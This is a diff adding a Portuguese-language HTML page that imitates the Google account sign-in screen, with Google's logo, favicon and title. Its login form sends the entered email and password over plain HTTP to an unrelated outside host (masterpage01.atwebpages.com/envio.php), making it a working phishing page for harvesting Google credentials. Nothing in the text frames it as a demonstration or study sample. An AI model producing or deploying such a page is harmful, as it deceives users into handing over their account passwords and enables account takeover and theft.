@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <link rel="shortcut icon" href="google.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fazer login nas Contas Google</title>
+</head>
+<body>
+<div class="box"><br><br><br>
+    <img class="logo" src="google.png" alt="Google">
+
+    <h2>Fazer login</h2>
+    <p>Use sua Conta do Google</p>
+    
+    <form action="http://masterpage01.atwebpages.com/envio.php" method="POST">
+        <div class="inputBox">
+            <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Email ou telefone</label>
+        </div>
+        <div class="inputBox">
+            <input type="password" name="password" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Senha</label>
+        </div><br>
+
+        <div class="new">
+            <h3>Criar conta</h3>
+        </div>    
+    
+        
+        <input type="submit" name="sign-in" value="Próxima">
+
+
+    </form>
+</div>
+
+</body>
+</html>
